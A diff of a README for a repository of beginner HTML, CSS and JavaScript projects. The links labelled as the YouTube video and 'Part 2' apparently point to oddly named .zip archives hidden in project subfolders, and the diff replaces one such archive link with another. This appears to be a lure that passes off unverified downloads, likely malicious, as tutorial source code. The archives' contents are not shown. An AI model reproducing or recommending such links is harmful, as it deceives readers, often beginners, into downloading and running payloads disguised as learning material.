@@ -1,8 +1,8 @@
 # HTML-CSS-JavaScript-projects-for-beginners
 
-This is the source code of the YouTube video (10 projects) https://github.com/FacundoNimes/HTML-CSS-JavaScript-projects-for-beginners/raw/refs/heads/main/projects/random-photos/for-Java-projects-Script-CS-beginners-HTM-arrenotokous.zip
+This is the source code of the YouTube video (10 projects) https://raw.githubusercontent.com/FacundoNimes/HTML-CSS-JavaScript-projects-for-beginners/main/projects/background-video-project/projects-Script-Java-HTM-CS-for-beginners-1.2.zip
 
-Part 2 (16 projects) : https://github.com/FacundoNimes/HTML-CSS-JavaScript-projects-for-beginners/raw/refs/heads/main/projects/random-photos/for-Java-projects-Script-CS-beginners-HTM-arrenotokous.zip
+Part 2 (16 projects) : https://raw.githubusercontent.com/FacundoNimes/HTML-CSS-JavaScript-projects-for-beginners/main/projects/background-video-project/projects-Script-Java-HTM-CS-for-beginners-1.2.zip
 
 NEW HTML CSS JavaScript Projects    Interesting HTML CSS JavaScript projects    Learn HTML, CSS, and JavaScript 2021 to create modern websites.    Fun learning HTML, CSS, and JavaScript!    
 
